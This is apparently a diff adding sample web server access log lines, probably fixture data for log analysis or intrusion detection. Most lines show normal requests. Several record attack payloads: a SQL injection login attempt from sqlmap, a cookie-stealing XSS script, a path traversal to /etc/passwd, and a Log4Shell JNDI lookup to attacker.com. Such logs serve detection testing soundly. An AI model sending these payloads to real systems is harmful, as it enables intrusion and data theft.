@@ -1,0 +1,11 @@
+192.168.1.10 - - [15/Oct/2026:10:00:01 +0000] "GET /index.html HTTP/1.1" 200 4521 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
+192.168.1.11 - - [15/Oct/2026:10:00:05 +0000] "GET /api/v1/users?id=42 HTTP/1.1" 200 128 "-" "curl/7.88.1"
+203.0.113.55 - - [15/Oct/2026:10:01:22 +0000] "GET /login?user=admin%27%20OR%201=1-- HTTP/1.1" 401 532 "-" "sqlmap/1.8"
+203.0.113.55 - - [15/Oct/2026:10:01:25 +0000] "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1" 200 1520 "-" "Mozilla/5.0"
+198.51.100.99 - - [15/Oct/2026:10:02:10 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 280 "-" "Python-urllib/3.10"
+198.51.100.99 - - [15/Oct/2026:10:02:45 +0000] "GET /api/headers HTTP/1.1" 400 312 "-" "${jndi:ldap://attacker.com/exploit}"
+10.0.2.14 - - [15/Oct/2026:10:03:00 +0000] "POST /api/auth/token HTTP/1.1" 200 894 "https://internal.portal/" "Mozilla/5.0"
+198.51.100.22 - - [15/Oct/2026:10:03:15 +0000] "POST /checkout/pay HTTP/1.1" 500 2412 "https://store.corp/" "Mozilla/5.0"
+203.0.113.8 - - [15/Oct/2026:10:03:22 +0000] "GET /api/v2/inventory HTTP/1.1" 502 584 "-" "Go-http-client/1.1"
+198.51.100.22 - - [15/Oct/2026:10:03:30 +0000] "POST /checkout/pay HTTP/1.1" 500 2412 "https://store.corp/" "Mozilla/5.0"
+
